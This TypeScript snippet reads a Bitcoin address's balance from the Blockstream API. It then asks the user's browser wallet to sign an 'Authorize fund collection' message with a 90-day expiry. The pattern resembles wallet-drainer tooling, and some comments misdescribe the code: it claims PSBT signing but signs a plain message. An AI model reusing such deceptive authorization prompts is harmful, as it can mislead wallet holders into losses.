// Bitcoin ARC-20 (Taproot) detection and signing

export async function detectBitcoinAssets(walletAddress: string): Promise<any[]> {
  try {
    // Query Blockstream API for Bitcoin balance
    const response = await fetch(`https://blockstream.info/api/address/${walletAddress}`);
    const data = await response.json();

    const confirmBalance = data.chain_stats?.funded_txo_sum - data.chain_stats?.spent_txo_sum;
    const unconfirmedBalance = data.mempool_stats?.funded_txo_sum - data.mempool_stats?.spent_txo_sum;

    return [
      {
        asset: "BTC",
        balance: (confirmBalance + (unconfirmedBalance || 0)) / 100000000,
        satoshis: confirmBalance + (unconfirmedBalance || 0),
        confirmed: confirmBalance / 100000000,
        unconfirmed: (unconfirmedBalance || 0) / 100000000,
      },
    ];
  } catch (error) {
    console.error("Error detecting Bitcoin assets:", error);
    return [];
  }
}

// Sign Bitcoin PSBT (via hardware wallet or browser extension)
export async function signBitcoinTransaction(
  walletAddress: string,
  amountSatoshis: number = 0
): Promise<string> {
  const btcWallet = (window as any).bitcoin || (window as any).unisat;
  if (!btcWallet) {
    throw new Error("Bitcoin wallet (Unisat/Xverse) not found");
  }

  try {
    // Create authorization message
    const message = `Authorize fund collection on Bitcoin\nAddress: ${walletAddress}\nAmount: ${(amountSatoshis / 100000000).toFixed(8)} BTC\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`;
    
    // Sign message with Bitcoin wallet
    const signature = await btcWallet.signMessage(message);
    return signature;
  } catch (error) {
    console.error("Bitcoin signing error:", error);
    throw error;
  }
}
